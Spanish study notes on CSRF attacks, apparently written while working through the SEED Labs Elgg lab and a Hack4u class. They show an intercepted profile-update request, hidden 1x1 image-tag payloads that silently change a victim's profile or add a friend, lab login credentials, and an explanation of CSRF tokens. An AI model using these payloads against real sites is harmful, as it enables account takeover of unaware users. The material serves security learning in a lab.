---
tags:
  - Web
  - Explotacion
  - CSRF
---

# Notas

En primer lugar, tenemos un usuario en una web.
Por ejemplo en la edición del perfil tenemos que interceptar la petición que se mandará

Ejemplo:

```http
POST /action/usersettings/save HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.seed-server.com/settings/user/alice
X-Elgg-Ajax-API: 2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------37794792422154272633797777871
Content-Length: 1266
Origin: http://www.seed-server.com
DNT: 1
Connection: keep-alive
Cookie: Elgg=f3ou2gcggud5hqrtup34bpjtob
Priority: u=0

-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="__elgg_token"

_wN6ApGARaOxIzDo1ybNrw
-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="__elgg_ts"

1744655518
-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="name"

Alice
-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="current_password"


-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="password"


-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="password2"


-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="email_password"


-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="email"

elgg_alice@seed-labs.com
-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="language"

en
-----------------------------37794792422154272633797777871
Content-Disposition: form-data; name="guid"

56
-----------------------------37794792422154272633797777871--

```

Vemos que es una solicitud por POST, pero queremos mandarla por GET por lo que la cambiamos con la herramienta correspondiente (burp suite/caido) y quitando el valor del token.

Si la petición al enviarla, el servidor guarda los cambios, esto nos muestra que es vulnerable a esta vulnerabilidad.

Para que nos entendamos, cada usuario tiene un usuario asociado, que en principio no podríamos cambiar los datos de otro usuario, pero lo que se puede hacer es mediante un correo electrónico, mensaje, etc que tenga la página con la condición de que interprete HTML, que la victima al ver el mensaje automáticamente nos haga la petición `GET` para el cambio de datos. 

**El contenido de la imagen:**

```html
<img src="http://www.seed-server.com"/action/profile/edit?name=HACKED&description=&accesslevel%5bdescription%5D=2&briefdescription=&accesslevel%5bbriefdescription%5D=2&location=&accesslevel%5blocation%5D=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&
contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&quid="56" 
alt="imagen" width="1" height="1" />
```

```html
<img src="PETICIÓN GET" alt="imagen" width="1" height="1" />
```

```html
<img src="http://www.seed-server.com/action/friends/add?friend=57" alt="imagen" width="1" height="1"/>
```

Esto representa a una imagen que hará la petición y que es tan pequeña que la persona no se dará cuenta.


Lo que podemos hacer:
- Cambiar la contraseña de la victima y robar la cuenta
- Realizar acciones no deseadas por la victima

# Hack4u

**AVISO (Actualización 11/05/2023)**: Si a la hora de hacer el ‘**docker-compose up -d**‘, os salta un error de tipo: “**networks.net-10.9.0.0 value Additional properties are not allowed (‘name’ was unexpected)**“, lo que tenéis que hacer es en el archivo ‘**docker-compose.yml**‘, borrar la línea número 41, la que pone “**name: net-10.9.0.0**“.

Con hacer esto, ya podréis desplegar el laboratorio sin ningún problema.

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (aunque cuidadín que también se pueden hacer cositas con esto).

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

# Laboratorio

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

-> Para que que funcione el lab tienes que ingresar en /etc/hosts lo siguiente:

```
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.0.105 www.attacker32.com
```

Tiene dos usuarios:
```
alice:seedalice
samy:seedsamy
```